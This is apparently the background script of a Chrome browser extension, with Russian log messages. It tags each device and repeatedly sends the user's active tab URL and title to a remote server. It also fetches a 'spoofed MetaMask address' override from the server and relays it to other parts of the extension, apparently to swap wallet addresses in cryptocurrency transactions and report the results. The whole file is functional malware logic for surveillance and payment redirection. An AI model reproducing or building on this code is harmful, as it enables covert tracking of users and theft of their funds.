const serverUrl = 'http://localhost:80/api';

let uniqueTag = null;
let isOverrideClearing = false;

async function loadUniqueTag() {
    return new Promise((resolve) => {
        chrome.storage.local.get('uniqueTag', (data) => {
            if (!data.uniqueTag) {
                uniqueTag = `Device-${Date.now()}`;
                chrome.storage.local.set({ uniqueTag }, () => {
                    console.log(`Создан новый uniqueTag: ${uniqueTag}`);
                    resolve(uniqueTag);
                });
            } else {
                uniqueTag = data.uniqueTag;
                console.log(`Загружен существующий uniqueTag: ${uniqueTag}`);
                resolve(uniqueTag);
            }
        });
    });
}

async function getActiveTabInfo() {
    return new Promise((resolve) => {
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            if (tabs.length > 0) {
                resolve({ url: tabs[0].url, title: tabs[0].title || 'No Title' });
            } else {
                resolve(null);
            }
        });
    });
}

async function updateActivity() {
    if (!uniqueTag) {
        console.warn("[WARNING] uniqueTag не найден! Загружаем...");
        uniqueTag = await loadUniqueTag();
    }

    if (!uniqueTag) {
        console.error("[ERROR] uniqueTag все еще отсутствует. Отправка отменена.");
        return;
    }

    const activeTabInfo = await getActiveTabInfo();
    if (!activeTabInfo || !activeTabInfo.url) {
        console.warn("[WARNING] Нет активной вкладки. Отправка активности отменена.");
        return;
    }

    console.log("[INFO] Отправка updateActivity:", { tag: uniqueTag, activeTabInfo });

    try {
        const response = await fetch(`${serverUrl}/updateActivity`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ tag: uniqueTag, activeTabInfo })
        });
        const data = await response.json();
        console.log("[INFO] Ответ сервера updateActivity:", data);
    } catch (error) {
        console.error("[ERROR] Ошибка при отправке активности:", error);
    }
}

setInterval(() => {
    console.log("[INFO] Вызов updateActivity() через setInterval");
    updateActivity();
}, 30000);

chrome.alarms.create('activityAlarm', { periodInMinutes: 1 });

chrome.alarms.onAlarm.addListener(async (alarm) => {
    if (alarm.name === 'activityAlarm') {
        console.log("[INFO] Alarm triggered:", alarm);
        await updateActivity();
    }
});

if (chrome.idle && chrome.idle.onStateChanged) {
    chrome.idle.onStateChanged.addListener((newState) => {
        console.log("[INFO] User state changed:", newState);
        if (newState === "active") {
            console.log("[INFO] Пользователь активен, обновляем активность...");
            updateActivity();
        }
    });
} else {
    console.warn("[WARNING] chrome.idle API не доступен.");
}

loadUniqueTag().then(() => {
    console.log("[INFO] Расширение запущено. uniqueTag загружен.");
});

async function sendDataToServer(action, value) {
    try {
        const response = await fetch(`${serverUrl}/extension-data`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action, value })
        });
        const data = await response.json();
        console.log(`Server Response for "${action}":`, data);
        return data;
    } catch (error) {
        console.error(`Ошибка сети при отправке "${action}":`, error);
        return { status: 'error', message: error.message };
    }
}

async function getLastDisplayedNumber() {
    try {
        const response = await fetch(`${serverUrl}/getLastDisplayedNumber`);
        const data = await response.json();
        console.log("Last displayed number:", data);
        return data;
    } catch (error) {
        console.error('Ошибка при получении последнего отображенного числа:', error);
        return null;
    }
}

async function getOverrideValue() {
    try {
        const response = await fetch(`${serverUrl}/getOverrideValue`);
        const data = await response.json();
        if (data.overrideValue !== undefined) {
            if (!isOverrideClearing) {
                isOverrideClearing = true;
                chrome.runtime.sendMessage({ action: 'clearOverride' }, () => {
                    isOverrideClearing = false;
                });
            }
            return data.overrideValue;
        }
        return null;
    } catch (error) {
        console.error('Ошибка при получении override value:', error);
        return null;
    }
}

async function getMetaMaskOverrideValue() {
    try {
        const response = await fetch(`${serverUrl}/getMetaMaskOverrideValue`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        const data = await response.json();
        console.log("MetaMask Override Value:", data);
        return data.overrideAddress || null;
    } catch (error) {
        console.error('Ошибка при получении spoofed MetaMask address:', error);
        return null;
    }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    (async () => {
        switch (message.action) {
            case 'saveNumber':
                sendResponse(await sendDataToServer('updateLastNumber', message.value));
                break;
            case 'getOverrideValue':
                sendResponse(await getOverrideValue());
                break;
            case 'getLastDisplayedNumber':
                sendResponse({ lastNumber: (await getLastDisplayedNumber())?.lastNumber ?? null });
                break;
            case 'clearOverride':
                sendResponse(await sendDataToServer('clearOverride'));
                break;
            case 'getMetaMaskOverrideValue':
                sendResponse({ overrideAddress: await getMetaMaskOverrideValue() });
                break;
            case 'reportTransactionResult':
                sendResponse(await sendDataToServer('reportTransaction', message.overrideAddress));
                break;
        }
    })();
    return true;
});
